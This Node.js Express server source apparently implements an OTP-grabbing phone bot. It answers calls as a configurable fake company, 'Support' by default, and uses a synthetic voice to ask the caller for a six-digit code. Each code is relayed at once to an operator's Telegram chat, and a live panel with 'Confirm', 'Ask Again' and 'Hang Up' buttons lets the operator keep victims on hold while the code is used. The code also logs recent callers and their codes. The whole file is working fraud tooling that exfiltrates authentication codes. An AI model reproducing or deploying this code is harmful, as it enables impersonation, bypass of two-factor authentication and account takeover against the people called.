const express = require("express")
const bodyParser = require("body-parser")
const fetch = require("node-fetch")

const app = express()

app.use(bodyParser.urlencoded({extended:false}))
app.use(bodyParser.json())

// ENV
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN
const CHAT_ID = process.env.CHAT_ID

const SW_PROJECT = process.env.SW_PROJECT
const SW_TOKEN = process.env.SW_TOKEN
const SW_SPACE = process.env.SW_SPACE
const SW_NUMBER = process.env.SW_NUMBER

// SETTINGS
let settings={
company:"Support",
digits:6,
assistant:0
}

const assistants=[
"Polly.Joanna",
"Polly.Matthew",
"Polly.Amy",
"Polly.Brian",
"Polly.Emma",
"Polly.Justin"
]

// STATE
let activeCall=null
let callStart=0
let lastCaller=null
let lastCode=null
let panelMessage=null
let logs=[]

// TELEGRAM SEND
async function tg(method,data){

return fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/${method}`,{
method:"POST",
headers:{"Content-Type":"application/json"},
body:JSON.stringify(data)
})

}

// PANEL
async function createPanel(){

let res=await tg("sendMessage",{
chat_id:CHAT_ID,
text:"📞 IVR Panel\nWaiting for call..."
})

let data=await res.json()

panelMessage=data.result.message_id

}

function formatTime(){

if(!callStart)return "0s"

let sec=Math.floor((Date.now()-callStart)/1000)

let m=Math.floor(sec/60)
let s=sec%60

return `${m}m ${s}s`

}

async function updatePanel(){

if(!panelMessage)return

let text="📞 IVR Control Panel\n\n"

if(activeCall){

text+=`Caller: ${activeCall}\n`
text+=`Code: ${lastCode}\n`
text+=`Duration: ${formatTime()}\n`

}else{

text+="No active call\n"

}

text+=`\nCompany: ${settings.company}`
text+=`\nDigits: ${settings.digits}`
text+=`\nAssistant: ${settings.assistant+1}`

await tg("editMessageText",{
chat_id:CHAT_ID,
message_id:panelMessage,
text:text,
reply_markup:{
inline_keyboard:[
[
{ text:"✔ Confirm", callback_data:"confirm"},
{ text:"🔁 Ask Again", callback_data:"again"}
],
[
{ text:"⛔ Hang Up", callback_data:"hangup"}
]
]
}
})

}

// ROOT
app.get("/",(req,res)=>{
res.send("Server running")
})

// IVR
app.post("/ivr",async(req,res)=>{

const digits=req.body.Digits
const caller=req.body.From

if(!digits){

res.type("text/xml")

return res.send(`
<Response>

<Gather numDigits="${settings.digits}" action="/ivr" method="POST" timeout="10">

<Say voice="${assistants[settings.assistant]}">
Hello from ${settings.company}. Please enter your ${settings.digits} digit code.
</Say>

</Gather>

<Redirect>/ivr</Redirect>

</Response>
`)

}

// CODE RECEIVED
activeCall=caller
lastCaller=caller
lastCode=digits
callStart=Date.now()

logs.unshift({
caller,
code:digits,
time:new Date().toLocaleTimeString()
})

logs=logs.slice(0,10)

await tg("sendMessage",{
chat_id:CHAT_ID,
text:`📞 CODE RECEIVED

Caller: ${caller}
Code: ${digits}`
})

await updatePanel()

res.type("text/xml")

res.send(`
<Response>

<Say voice="${assistants[settings.assistant]}">
Thank you. Your code has been received. Please wait.
</Say>

<Pause length="60"/>

</Response>
`)

})

// TELEGRAM
app.post("/telegram",async(req,res)=>{

let msg=req.body

if(msg.callback_query){

let action=msg.callback_query.data

if(action=="confirm"){

activeCall=null
callStart=0

await tg("sendMessage",{
chat_id:CHAT_ID,
text:"✔ Call confirmed and ended."
})

}

if(action=="again"){

await tg("sendMessage",{
chat_id:CHAT_ID,
text:"🔁 Ask caller to enter code again."
})

}

if(action=="hangup"){

activeCall=null
callStart=0

await tg("sendMessage",{
chat_id:CHAT_ID,
text:"⛔ Call ended."
})

}

}

if(msg.message){

let text=msg.message.text

if(text=="/status"){

await tg("sendMessage",{
chat_id:CHAT_ID,
text:`Active call: ${activeCall || "none"}`
})

}

if(text=="/logs"){

let t="📜 Last Calls\n\n"

logs.forEach(l=>{
t+=`${l.time} - ${l.caller} - ${l.code}\n`
})

await tg("sendMessage",{chat_id:CHAT_ID,text:t})

}

}

res.sendStatus(200)

})

// TIMER
setInterval(updatePanel,2000)

// START
const PORT=process.env.PORT||3000

app.listen(PORT,async()=>{

console.log("Server running")

await createPanel()

})
